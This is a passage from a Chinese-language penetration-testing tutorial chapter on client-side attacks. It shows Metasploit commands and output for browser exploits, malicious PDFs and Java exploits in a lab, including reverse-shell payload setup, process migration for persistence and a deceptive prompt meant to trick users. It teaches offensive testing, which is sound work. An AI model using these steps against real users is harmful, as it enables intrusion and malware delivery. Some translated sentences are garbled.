  \ ❷ 所示。虽然这种负载在许多情况下有效，但某些过滤技术无论它尝试连接到哪个端口，都能阻止它。这种负载的一个缺点是它可能会运行很长时间以寻找一个未过滤的端口。如果用户看到应用程序挂起，他或她可能会在负载成功之前将其关闭。\n\
  \n### HTTP 和 HTTPS 负载\n\n虽然某些过滤器允许所有流量通过某些端口输出，但最先进的过滤系统使用内容检查（content inspection）来筛选特定的合法协议流量。这会为我们的负载带来问题。即使我们的\
  \ Meterpreter 负载通信是加密的——内容检查无法说“那是 Metasploit，请离开！”——过滤器也将能够识别出通过端口 80 传出的流量不符合\
  \ HTTP 规范。\n\n为了应对这一挑战，Metasploit 的开发者创建了 HTTP 和 HTTPS 负载。这些负载遵循 HTTP 和 HTTPS 规范，以便即使内容检查过滤器也会认为我们的流量是合法的。此外，这些负载是基于包的，而不是像\
  \ TCP 负载那样基于流的。这意味着它们不受限于特定的连接。如果你短暂丢失网络通信并丢失了所有的 Metasploit 会话，HTTP 和 HTTPS 会话可以恢复并重新连接。（我们将在\
  \ Java 漏洞 中查看使用这些负载的示例。）\n\n尽管 HTTP 和 HTTPS 负载可以让你穿过大多数过滤技术，但你可能会发现自己处于一种更为更的过滤环境中。例如，我测试过一个客户端，只有由域身份验证用户启动的\
  \ Internet Explorer 进程才能访问互联网。员工可以浏览互联网执行业务，但受到了一定程度的限制。例如他们不能使用即时通讯客户端。虽然这可能让一些员工感到恼，但从安全角度考虑，这是一个好主意。即使我们能够成功利用某个漏洞，即使是\
  \ HTTP 和 HTTPS 负载也无法到达互联网。（在浏览器利用 中，我们将查看一些攻击方法，这些方法允许我们在合法域用户登录时利用 Internet Explorer\
  \ 进程并连接到外部世界。）\n\nMeterpreter HTTP 和 Meterpreter HTTPS 使用 Internet Explorer 的代理设置来导航任何必要的代理以访问互联网。由于由于，如果你的目标进程是以\
  \ `System` 用户身份运行，可能没有定义这些代理设置，负载可能会失败。\n\n### 注意\n\n还有一个 Meterpreter 负载 `reverse_https_proxy`，它允许攻击者手动添加任何必要的代理设置。\n\
  \n### 客户端攻击\n\n现在让我们关注运行客户端攻击。我们不再直接攻击监听端口的服务，而是创建各种恶意文件，这些文件在目标机器上的漏洞软件中打开时将导致系统被破坏。\n\
  \n到目前为止，我们所有的攻击都涉及某种在端口监听的服务，无论是 Web 服务器、FTP 服务器、SMB 服务器还是其他。当我们开始渗透测试时，做的第一件事之一是对目标进行端口扫描，查看哪些服务正在监听。当我们开始渗透测试时，潜在的漏洞是无限的。\n\
  \n随着我们开始运行工具、进行手动分析和研究，利用的可能性逐渐减少，直到目标系统上只剩下有限的问题。那些问题都是服务端问题——即监听端口的服务。我们缺失的是任何不监听端口的潜在漏洞软件——客户端软件。\n\
  \n像 Web 浏览器、文档查看器、音乐播放器等软件面临着与 Web 服务器、邮件服务器以及其他所有网络程序相同的问题。\n\n当然，由于客户端软件没有在网络监听，我们无法直接攻击它，但通用原理是相同的。如果我们能向程序发送意外输入来触发漏洞，我们就可以劫持执行，就像我们在第\
  \ 8 章 中利用服务端程序一样。由于我们无法通过网络直接向客户端程序发送输入，我们必须诱用户打开恶意文件。\n\n随着安全受到越来越多的重视，服务端漏洞从面向互联网的角度变得越来越难以发现，客户端利用正成为访问受保护内部网络的关键。对于工作站或移动设备等缺乏面向互联网\
  \ IP 地址的资产，客户端攻击是理想的。尽管从互联网的角度我们无法直接访问这些系统，但如果我们能劫持执行，它们通常可以访问互联网或访问渗透测试人员控制的系统。\n\
  \n遗憾的是，客户端攻击的成功取决于如何设法让利用在漏洞产品中被下载并打开。在下一章节中，我们将查看一些诱导用户打开恶意文件的技术；现在我们将查看一些客户端利用，从最可能是客户端利用的最流行的目标：Web\
  \ 浏览器开始。\n\n### 浏览器利用\n\nWeb 浏览器由用于渲染网页的代码组成。就像我们可以向服务器软件发送格式不良的输入一样，如果我们打开带有恶意代码的网页来触发安全问题，我们就有可能劫持浏览器的执行并执行负载。虽然交付方式略有不同，但基本概念是相同的。所有常见的浏览器都曾面临安全问题——Internet\
  \ Explorer、Firefox 甚至 Mobile Safari。\n\n#### 通过浏览器利用进行 iPhone 越狱\n\n\n\n\n在过去，浏览器漏洞一直是\
  \ iPhone 越狱中起关键作用的。虽然后版本的 iOS 实施了名为`强制代码签名`（mandatory code signing）的安全功能，它要求所有执行的代码都必须经过\
  \ Apple 的批准，但 Mobile Safari（iPhone 上的网页浏览器）获得了豁免，因为为了渲染网页，它必须能够未签名的代码。Apple 无法遍历互联网所有的页面并对所有不包含恶意代码的内容进行签名。如果\
  \ iPhone 无法查看网页，大家都会去买安卓手机——这正是 Apple 最不希望看到的。当 iOS 4 在 Mobile Safari 中渲染 PDF 文档时，其中一个字体包含一个安全漏洞。这种客户端攻击允许越狱者通过诱骗用户在浏览器中打开恶意链接，就能在\
  \ iPhone 上获得立足点。\n\n让我们考虑 Internet Explorer 中一个著名的漏洞。Aurora 漏洞曾在 2010 年被用于攻击 Google、Adobe\
  \ 和 Yahoo! 等大公司。在 Aurora 攻击期间，Internet Explorer 包含一个`零日漏洞`（zero-day vulnerability）——一个尚未被修复的漏洞。（即使是完全更新的\
  \ Internet Explorer 版本，如果用户被诱骗打开恶意网页并触发该漏洞，也可能被破解。）\n\n微软已经发布了 Internet Explorer\
  \ 的补丁，但与其他安全补丁一样，用户有时会忽略更新浏览器，而安装在 Windows XP 目标机器上的 Internet Explorer 版本并没有必要的安全补丁来防御\
  \ Aurora 漏洞。\n\n我们将使用 Metasploit，通过 Aurora Metasploit 模块 `exploit/windows/browser/ms10_002_aurora`\
  \ 攻击有漏洞的浏览器来控制目标机器，该模块见示例 10-2。\n\n### Note\n\n客户端 Metasploit 模块在根本上与我们目前为止使用的服务端模块相同，不同之处选项稍有不同：我们不是向网络上的远程主机发送利用程序，而是建立一个服务器并等待浏览器访问我们的页面。\n\
  \n### 示例 10-2. Internet Explorer Aurora Metasploit 模块\n\n```\nmsf > use exploit/windows/browser/ms10_002_aurora\n\
  msf  exploit(ms10_002_aurora) > show options\n\nModule options (exploit/windows/browser/ms10_002_aurora):\n\
  \n   Name        Current Setting  Required  Description\n   ----        ---------------\
  \  --------  -----------\n  ❶SRVHOST     0.0.0.0          yes       监听的本地主机。这必须是本地机器上的地址\n\
  \                                            或 0.0.0.0\n  ❷SRVPORT     8080    \
  \         yes       监听的本地端口。\n  ❸SSL         false            no        为传入的连接协商\
  \ SSL\n   SSLCert                      no        自定义 SSL 证书的路径（默认是随机\n         \
  \                                   生成的）\n   SSLVersion  SSL3             no   \
  \     指定应该使用的 SSL 版本\n                                            （接受: SSL2, SSL3,\
  \ TLS1）\n  ❹URIPATH                      no        此利用程序使用的 URI（默认是随机）\n\nExploit\
  \ target:\n\n   Id  Name\n   --  ----\n  ❺0   Automatic\n```\n\n注意模块的选项，我们看到的不是\
  \ `RHOST` 而是 `SRVHOST` ❶ 选项。这是服务器的本地 IP 地址。默认情况下，该地址被设置为 0.0.0.0，以监听本地系统上的所有地址。默认监听端口\
  \ `SRVPORT` ❷ 选项是 8080。只要没有其他程序使用该端口，你就可以将端口号改为 80（Web 服务器的默认端口）。你甚至可以使用 SSL 连接\
  \ ❸。\n\n\n\n\n我们的 Meterpreter 负载完全存在于被利用进程的内存中。如果浏览器崩溃或被用户关闭，我们的会话也会随之结束，如❶❶所示。我们失去系统立脚点的速度和获得它时一样快。\n\
  \n我们需要一种方法来保持 Meterpreter 会话的活跃，即使被利用的进程（在此例中为 Internet Explorer 浏览器）崩溃如此。但首先，我们需要停止\
  \ Metasploit Web 服务器，这样我们就可以对恶意页面进行一些更改来解决这个问题，如示例 10-5 所示。\n\n#### 示例 10-5. 在 Metasploit\
  \ 中杀死后台任务\n\n```\nmsf  exploit(ms10_002_aurora) > jobs❶\n\nJobs\n====\n\n  Id  Name\n\
  \  --  ----\n  0   Exploit: windows/browser/ms10_002_aurora\n\nmsf  exploit(ms10_002_aurora)\
  \ > kill 0❷\nStopping job: 0...\n\n[*] Server stopped.\n```\n\n我们可以通过输入 `jobs` ❶\
  \ 看到 Metasploit 中后台运行的所有内容。要停止后台运行的任务，请输入 `kill <job number>` ❷。\n\n由于 Meterpreter\
  \ 完全存在于被利用进程的内存中，而该进程注定会崩溃，我们需要某种方法将会话从 Internet Explorer 进程移动到另一个可能持久运行的进程中。\n\n\
  #### 在 Meterpreter 会话中运行脚本\n\n与网络攻击不同（网络攻击成功时，我们会立即看到会话），在执行客户端攻击时，我们必须等待直到用户访问我们的恶意页面。即使我们找到了将\
  \ Meterpreter 移动到另一个进程的方法，会话也可能随时进入。在渗透测试期间，我们任何时候都不能分心，否则将面临丢失会话的风险。如果能够自动在 Meterpreter\
  \ 会话中运行命令，将是理想的，这样我们无需坐在等待浏览器访问我们的恶意服务器。\n\n在 Kali 中，可以在打开会话中运行的 Meterpreter 可以在\
  \ `/usr/share/metasploit-framework/scripts/meterpreter` 找到。我们将在第 13 章中查看更多 Meterpreter\
  \ 脚本的示例，但现在让我们看一个与当前场景非常的特定 Meterpreter 脚本。`migrate.rb` 脚本允许我们将 Meterpreter 从一个进程的内存移动到另一个进程，这正是我们在这里需要的。要在活跃的\
  \ Meterpreter 会话中运行 Meterpreter 脚本，请输入 `run <script name>`，如示例 10-6 所示。你可能会看到有关如何正确使用脚本的帮助信息，如此处所示。\n\
  \n#### 示例 10-6. 运行 Meterpreter 脚本\n\n```\nmeterpreter > run migrate\n\nOPTIONS:\n\
  \n    -f        启动进程并迁移到新进程 ❶\n    -h        帮助菜单。\n    -k        杀死原始进程。\n    -n\
  \ <opt>  迁移到具有此可执行文件名称（explorer.exe）的进程 ❷\n    -p <opt>  要迁移到的 PID。❸\n```\n\n当我们尝试运行\
  \ `migrate` 脚本时，我们看到了几个选项。我们可以启动新进程并迁移到该进程，如❶ 所示；迁移到具有指定名称的进程❷；或通过进程 ID 选择进程，如❸\
  \ 所示。\n\n#### 高级参数\n\n除了模块和负载选项外，Metasploit 模块还有高级参数。我们可以通过 `show advanced` 命令查看可用的高级参数，如示例\
  \ 10-7 所示。\n\n#### 示例 10-7. Metasploit 高级参数\n\n```\nmsf  exploit(ms10_002_aurora)\
  \ > show advanced\n\nModule advanced options:\n\n   Name           : ContextInformationFile\n\
  \   Current Setting:\n   Description    : 包含上下文信息的文件\n\n   --snip--\n   Name   \
  \        : AutoRunScript❶\n   Current Setting:\n   Description    : 在会话创建时自动运行的脚本。\n\
  \n   --snip--\n   Name           : WORKSPACE\n   Current Setting:\n   Description\
  \    : 为此模块指定工作区\n```\n\n我们所选负载的高级设置之一是 `AutoRunScript` ❶。设置后，该设置将允许我们在会话打开时自动运行\
  \ Meterpreter 脚本。\n\n我们可以设置此参数以在 Meterpreter 会话打开时自动运行 `migrate` 脚本。这样，当浏览器崩溃时，只要\
  \ `migrate` 脚本已完成，我们的会话就不会受到崩溃的影响。此外，通过自动运行脚本，我们可以在用户访问恶意页面时随时迁移，无论会话进入时你是否正盯着 Msfconsole，如示例\
  \ 10-8 所示。\n\n#### 示例 10-8. 设置 `AutoRunScript` 参数\n\n```\nmsf  exploit(ms10_002_aurora)\
  \ > set AutoRunScript migrate -f❶\nAutoRunScript => migrate -f\nmsf  exploit(ms10_002_aurora)\
  \ > exploit\n[*] Exploit running as background job.\n\n[*] Started reverse handler\
  \ on 192.168.20.9:4444\n[*] Using URL: http://192.168.20.9:80/aurora\n[*] Server\
  \ started.\n```\n\n要设置高级参数，使用语法 `set <parameter to set> <value>`（与设置普通选项相同）。例如，在示例\
  \ 10-8 中，我们告诉 `migrate` 脚本使用 `-f` 标记生成一个新进程进行迁移，然后我们重新启动恶意服务器。\n\n现在再次从 Windows\
  \ XP 目标浏览到恶意页面（参见示例 10-9）。\n\n#### 示例 10-9. 自动迁移\n\n```\nmsf  exploit(ms10_002_aurora)\
  \ > [*] 192.168.20.10       ms10_002_aurora - Sending Internet Explorer \"Aurora\"\
  \ Memory Corruption\n[*] Sending stage (752128 bytes) to 192.168.20.10\n[*] Meterpreter\
  \ session 2 opened (192.168.20.9:4444 -> 192.168.20.10:1422) at 2015-05-05 20:26:15\
  \ -0400\n[*] Session ID 2 (192.168.20.9:4444 -> 192.168.20.10:1422) processing AutoRunScript\
  \ 'migrate -f' ❶\n[*] Current server process: iexplore.exe (3476)\n[*] Spawning\
  \ notepad.exe process to migrate to\n[+] Migrating to 484\n[+] Successfully migrated\
  \ to process ❷\n```\n\n这一次我们得到了一个会话，显示 `AutoRunScript` 参数正在自动处理❶。`migrate` 脚本生成了一个\
  \ `notepad.exe` 进程并移动其中❷。当 Internet Explorer 崩溃时，我们的会话仍然活跃。\n\n虽然在使用浏览器漏洞时自动迁移是一个好主意，但迁移发生仍需几秒钟——在这几秒钟内，用户可能会关闭浏览器并杀死我们的会话。幸运的是，此处所示的高级\
  \ Meterpreter 选项 `PrependMigrate` 将更快，在运行负载之前进行迁移。\n\n```\nName           : PrependMigrate\n\
  Current Setting: false\nDescription    : 在新进程中生成并运行 shellcode\n```\n\n你可以将此选项设置为\
  \ `true`，作为我们之前使用的 `AutoRunScript` 的替代方案。\n\n这只是浏览器漏洞的一个示例。Metasploit 还有其他模块用于利用\
  \ Internet Explorer 以及其他流行网络浏览器的漏洞。\n\n\n\n\nAurora 漏洞已于 2010 年修补，但用户和组织并不擅长更新浏览器，因此这种漏洞在今天仍然能找到目标。此外，虽然操作系统的新的远程漏洞并不少见，但像\
  \ Internet Explorer 这样的主要浏览器经常成为新的客户端攻击的受害者。如在第 4 章中讨论的那样，使用 `Msfupdate` 来获取新漏洞的最新模块，其中某些漏洞在模块发布时可能甚至还没有被厂商修复。请注意，运行\
  \ `Msfupdate` 可能会影响 Metasploit 的工作方式，这可能会使你难以跟本书内容。因此，你可能希望在读完这本书之后再更新 Metasploit。\n\
  \n现在让我们来看一些其他可以被利用以在目标系统上获取命令执行权的客户端软件。\n\n### PDF 漏洞\n便携文档格式（PDF）软件也可以被利用。如果用户被诱导在有漏洞的查看器中打开恶意\
  \ PDF，该程序就可以被利用。\n\nWindows 系统上流行的 PDF 查看器是 Adobe Reader。与浏览器一样，Adobe Reader 的历史充满了安全漏洞。同样像浏览器一样，即使实施了补丁管理流程，经常更新底层操作系统和\
  \ PDF 软件往往会被忘记，并留在旧的有漏洞版本中。\n\n#### 利用 PDF 漏洞\n我们的 Windows XP 目标安装了过时的 Adobe Reader\
  \ 8.1.2，该版本受到 CVE-2008-2992 的影响，这是一个基于栈的缓冲区溢出。相应的 Metasploit 模块是 `exploit/windows/fileformat/adobe_utilprintf`。\n\
  \n该模块的选项与我们目前为止见过的任何内容都有些不同，如示例 10-10 所示。这是一个客户端攻击，因此没有 `RHOST` 选项，但与我们的浏览器攻击不同，它也没有\
  \ `SRVHOST` 或 `SRVPORT` 选项。该模块仅创建一个恶意 PDF；将其托管以便发送以及设置有效负载处理程序取决于我们。当然，我们拥有所有必要的技能来轻松地完成这两项任务。\n\
  \n示例 10-10. 一个 Metasploit PDF 漏洞\n\n```\nmsf > use exploit/windows/fileformat/adobe_utilprintf\n\
  msf  exploit(adobe_utilprintf) > show options\n\nModule options (exploit/windows/fileformat/adobe_utilprintf):\n\
  \n   Name      Current Setting  Required  Description\n   ----      ---------------\
  \  --------  -----------\n  ❶FILENAME  msf.pdf          yes       The file name.\n\
  \nExploit target:\n\n   Id  Name\n   --  ----\n  ❷0   Adobe Reader v8.1.2 (Windows\
  \ XP SP3 English)\n\nmsf  exploit(adobe_utilprintf) > exploit\n\n[*] Creating 'msf.pdf'\
  \ file...\n[+] msf.pdf stored at /root/.msf4/local/msf.pdf ❸\n```\n\n如你所示，PDF 漏洞的唯一选项是要生成的恶意文件名称\
  \ ❶。我们可以保留默认值 `msf.pdf`。对于此示例，我们将让 Metasploit 在端口 4444 上使用默认有效负载 `windows/meterpreter/reverse_tcp`。当我们输入\
  \ `exploit` 时，Metasploit 会生成一个 PDF，该 PDF 将利用 Windows XP SP3 English 上有漏洞的 Adobe\
  \ Reader 版本中的漏洞 ❷。恶意 PDF 存储在 `/root/.msf4/local/msf.pdf` ❸。\n\n现在我们需要提供 PDF 并为有效负载设置处理程序，如示例\
  \ 10-11 所示。\n\n示例 10-11. 提供恶意 PDF 并使用处理程序\n\n```\nmsf  exploit(adobe_utilprintf)\
  \ > cp /root/.msf4/local/msf.pdf /var/www\n[*] exec: cp /root/.msf4/local/msf.pdf\
  \ /var/www\n\nmsf  exploit(adobe_utilprintf) > service apache2 start\n[*] exec service\
  \ apache2 start\n\nStarting web server: apache2.\n\nmsf  exploit(adobe_utilprintf)\
  \ > use multi/handler❶\nmsf  exploit(handler) > set payload windows/meterpreter/reverse_tcp\n\
  payload => windows/meterpreter/reverse_tcp\nmsf  exploit(handler) > set LHOST 192.168.20.9\n\
  lhost => 192.168.20.9\nmsf  exploit(handler) > exploit\n\n[*] Started reverse handler\
  \ on 192.168.20.9:4444\n[*] Sending stage (752128 bytes) to 192.168.20.10\n[*] Meterpreter\
  \ session 2 opened (192.168.20.9:4444 -> 192.168.20.10:1422) at\n2015-05-05 20:26:15\
  \ -0400 ❷\n```\n\n我们将文件复制到 Apache Web 服务器文件夹并启动服务器（如果它尚未运行的话）。我们将在本章的晚些部分研究诱导用户打开恶意文件的方法，但目前我们只在\
  \ Windows XP 目标上的 Adobe Reader 8.1.2 中打开恶意 PDF。首先，我们需要为有效负载设置一个处理程序。我们可以像在第 4 章中学习的那样使用\
  \ `multi/handler` ❶ 模块。（如果 Aurora 任务的处理程序也在监听端口 4444，请务必杀死它以释放该端口供 `multi/handler`\
  \ 使用）。当我们打开恶意 PDF 时，我们再次收到一个会话 ❷。\n\n通常情况下，这种攻击不会只针对一个用户。为了获得最佳效果，我们可以将此恶意 PDF 作为社交工程活动的一部分（正如下一章将讨论的那样），通过发送几个甚至数百个恶意\
  \ PDF 来试图诱导用户打开它们。我们之前设置的 `multi/handler` 监听器一旦看到第一个连接就会关闭，导致我们错过其他用户打开 PDF 时进入的任何其他连接。如果我们能保持监听器开启以捕获额外的传入连接，将会好得多。\n\
  \n事实证明，`multi/handler` 模块的一个高级选项解决了这个问题。如示例 10-12 所示，默认设置为 `true` 的高级选项 `ExitOnSession`\
  \ 指定了监听器在接收会话后是否关闭。如果我们将此选项设置为 `false`，监听器将保持开启并允许我们使用单个处理器捕获多个会话。\n\n示例 10-12.\
  \ 为多个会话保持处理器开启\n\n```\nmsf exploit(handler) > show advanced\nModule advanced options:\n\
  --snip--\n   Name           : ExitOnSession\n   Current Setting: true\n   Description\
  \    : Return from the exploit after a session has been created\nmsf exploit(handler)\
  \ > set ExitOnSession false❶\nExitOnSession => false\nmsf exploit(handler) > exploit\
  \ -j❷\n[*] Exploit running as background job.\n[*] Started reverse handler on 192.168.20.9:4444\n\
  [*] Starting the payload handler...\n```\n\n以通常方式❶ 将 `ExitOnSession` 设置为 `false`。此选项的一个副作用是，如果我们在前台执行漏洞并启动监听器，它永远不会关闭，导致我们陷入无限没有\
  \ Msfconsole 提示符的状态。因此，Metasploit 会报错并指出你你应该在使用 `exploit` 时配合 `-j` 选项❷ 将处理程序作为作业在后台运行。这样你就可以继续使用\
  \ Msfconsole，同时让处理器在后台捕获任何传入的 shell。将来要关闭处理器时，请使用 `jobs` 然后接 `kill` `<job number>`，我们在\
  \ Aurora 示例中做的那样。\n\n之前讨论的这种漏洞和 Aurora 浏览器示例都依赖于缺失的安全补丁。在这里，我们利用了一个安全漏洞，通过欺骗用户让我们运行恶意代码来劫持程序的控制权并执行恶意代码。如果用户允许我们运行代码，PDF\
  \ 软件中的漏洞就不再需要了。\n\n#### PDF 嵌入可执行文件\n\n\n\n\n\n现在来看另一种 PDF 攻击：这次我们将在 PDF 中嵌入一个恶意可执行文件。对应的\
  \ Metasploit 模块是 `exploit/windows/fileformat/adobe_pdf_embedded_exe`，如示例 10-13 所示。生成的\
  \ PDF 不会在打开时立即利用漏洞，而是会提示用户请求运行嵌入文件的权限。我们攻击的成功取决于用户是否运行我们的可执行文件。\n\n### 示例 10-13.\
  \ PDF 嵌入 EXE 模块\n\n```\nmsf > use exploit/windows/fileformat/adobe_pdf_embedded_exe\n\
  msf  exploit(adobe_pdf_embedded_exe) > show options\n\nModule options (exploit/windows/fileformat/adobe_pdf_embedded_exe):\n\
  \n   Name            Current Setting                        Required  Description\n\
  \   ----            ---------------                        --------  -----------\n\
  \  ❶EXENAME                                                no        payload exe\
  \ 文件的名称。\n  ❷FILENAME        evil.pdf                               no        输出文件名。\n\
  \  ❸INFILENAME                                             yes       输入 PDF 文件名。\n\
  \  ❹LAUNCH_MESSAGE  To view the encrypted content please   no        显示在文件区域的\n\
  \                     tick the \"Do not show this message               的消息\n  \
  \                   again\" box and press Open.\n--snip--\n```\n\n该模块允许我们通过 `EXENAME`\
  \ ❶ 选项指定一个预构建的可执行文件。如果不设置此选项，我们可以嵌入从所选 payload 创建的任何 `.*exe` 文件。我们可以再次将文件名更改为任何内容，或保持默认值\
  \ ❷。要使用此模块，我们必须为 `INFILENAME` ❸ 选项提供输入 PDF。`LAUNCH_MESSAGE` ❹ 选项是作为运行可执行文件提示的一部分显示给用户的文本。\n\
  \n设置相关选项，如示例 10-14 所示。\n\n### 示例 10-14. 设置模块选项并创建恶意 PDF\n\n```\nmsf  exploit(adobe_pdf_embedded_exe)\
  \ > set INFILENAME /usr/share/set/readme/User_Manual.pdf❶\nINFILENAME => /usr/share/set/readme/User_Manual.pdf\n\
  msf  exploit(adobe_pdf_embedded_exe) > set payload windows/meterpreter/reverse_tcp\n\
  payload => windows/meterpreter/reverse_tcp\nmsf  exploit(adobe_pdf_embedded_exe)\
  \ > set LHOST 192.168.20.9\n                                                   \
  \                          LHOST => 192.168.20.9\nmsf  exploit(adobe_pdf_embedded_exe)\
  \ > exploit\n\n[*] Reading in '/usr/share/set/readme/User_Manual.pdf'...\n[*] Parsing\
  \ '/usr/share/set/readme/User_Manual.pdf'...\n[*] Using 'windows/meterpreter/reverse_tcp'\
  \ as payload...\n[*] Parsing Successful. Creating 'evil.pdf' file...\n[+] evil.pdf\
  \ stored at /root/.msf4/local/evil.pdf❷\n```\n\n我们将使用 Kali Linux 自带的一个 PDF 作为示例：即位于\
  \ `/user/share/set/readme/User_Manual.pdf` ❶ 的 Metasploit 用户指南。生成的 PDF 存储在 `/root/msf4/local/`\
  \ 目录 ❷ 下。（在 Windows XP 目标上打开 PDF 之前，请务必使用 `multi/handler` 模块为 payload 设置处理器。需要复习的话，请参考示例\
  \ 10-11）。\n\n### 注意\n之前的漏洞可能导致 Adobe Reader 处于异常状态，因此你可能需要重启 Windows XP 才能正确加载新的\
  \ PDF。\n\n当打开恶意 PDF 时，用户会看到如图 10-1 所示的警告。用户必须点击“打开”，嵌入的可执行文件才能运行。这种攻击取决于用户愿意点击此警告。\n\
  \n![PDF 嵌入可执行文件用户警告](img/httpatomoreillycomsourcenostarchimages2030396.png.jpg)图\
  \ 10-1. PDF 嵌入可执行文件用户警告\n\n一旦你在 PDF 警告中点击“打开”，payload 就会运行，你将获得会话。\n\n### Java 漏洞\n\
  Java 漏洞是一种常见的客户端攻击向量。事实上，一些专家建议，鉴于困扰 Java 的安全性，用户应该在浏览器中卸载或禁用该软件。\n\nJava 攻击如此强大的一个原因是是，一个漏洞就可以访问多个平台。当运行\
  \ Java 运行时环境 (JRE) 的 Windows、Mac 甚至 Linux 系统的浏览器打开恶意页面时，都可以被完全相同的漏洞进行攻击。以下是一些示例利用程序。\n\
  \n#### Java 漏洞\n作为第一个示例，我们将使用 Metasploit 模块 `exploit/multi/browser/java_jre17_jmxbean`，如示例\
  \ 10-15 所示。该模块的使用与本章早期所示的 Internet Explorer Aurora 漏洞类似。Metasploit 会建立一个恶意服务器，以利用访问该页面的任何浏览器上的此跨平台漏洞。任何运行更新\
  \ 11 之前的 Java 7 版本的浏览器都会受到影响。\n\n### 示例 10-15. 设置 Java 漏洞\n\n```\nmsf > use exploit/multi/browser/java_jre17_jmxbean\n\
  msf  exploit(java_jre17_jmxbean) > show options\n\nModule options (exploit/multi/browser/java_jre17_jmxbean):\n\
  \n   Name        Current Setting  Required  Description\n   ----        ---------------\
  \  --------  -----------\n   SRVHOST     0.0.0.0          yes       监听的本地主机。这必须是本地机器上的地址\n\
  \                                            或 0.0.0.0\n   SRVPORT     8080    \
  \         yes       监听的本地端口。\n--snip--\n   URIPATH                      no     \
  \   此漏洞使用的 URI（默认随机）\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Generic\
  \ (Java Payload)\n\nmsf  exploit(java_jre17_jmxbean) > set SRVHOST 192.168.20.9\n\
  SRVHOST => 10.0.1.9\nmsf  exploit(java_jre17_jmxbean) > set SRVPORT 80\nSRVPORT\
  \ => 80\nmsf  exploit(java_jre17_jmxbean) > set URIPATH javaexploit\nURIPATH =>\
  \ javaexploit\nmsf  exploit(java_jre17_jmxbean) > show payloads❶\n\nCompatible Payloads\n\
  ===================\n\n   Name                            Disclosure Date  Rank\
  \    Description\n   ----                            ---------------  ----    -----------\n\
  --snip--\n   java/meterpreter/bind_tcp                        normal  Java Meterpreter,\
  \ Java Bind TCP\n                                   Stager\n   java/meterpreter/reverse_http\
  \                    normal  Java Meterpreter, Java Reverse HTTP\n             \
  \                      Stager\n   java/meterpreter/reverse_https               \
  \    normal  Java Meterpreter, Java Reverse\n                                  \
  \                            HTTPS Stager\n   java/meterpreter/reverse_tcp     \
  \                normal  Java Meterpreter, Java Reverse TCP\n                  \
  \                                            Stager\n   java/shell_reverse_tcp \
  \                          normal  Java Command Shell, Reverse TCP\n           \
  \                                                   Inline\n--snip--\nmsf  exploit(java_jre17_jmxbean)\
  \ > set payload java/meterpreter/reverse_http❷\npayload => java/meterpreter/reverse_http\n\
  ```\n\n设置选项以匹配你的环境。将 `SRVHOST` 选项设置为本地 IP 地址，并根据需要更改 `SRVPORT`。将 `URIPATH` 设置为在目标浏览器中易于的内容。\n\
  \n\n\n\n\n请注意，由于此漏洞是跨平台的，且代码执行完全在 JRE 内部进行，因此我们的负载（payload）选项是基于 Java 的。常见的手段这里都有，从分阶段负载、内联负载、绑定\
  \ shell（bind shells）、反向 shell、Meterpreter 等，如列表 ❶ 处的负载列表所示。我们将使用 `java/meterpreter/reverse_http`\
  \ 负载，它使用合法的 HTTP 流量 ❷。其选项已在 示例 10-16 所示。\n\n## 示例 10-16. 使用 HTTP 负载利用 Java 漏洞\n\n\
  ```\nmsf  exploit(java_jre17_jmxbean) > show options\n\nModule options (exploit/multi/browser/java_jre17_jmxbean):\n\
  \n--snip--\n\nPayload options (java/meterpreter/reverse_http):\n\n   Name   Current\
  \ Setting  Required  Description\n   ----   ---------------  --------  -----------\n\
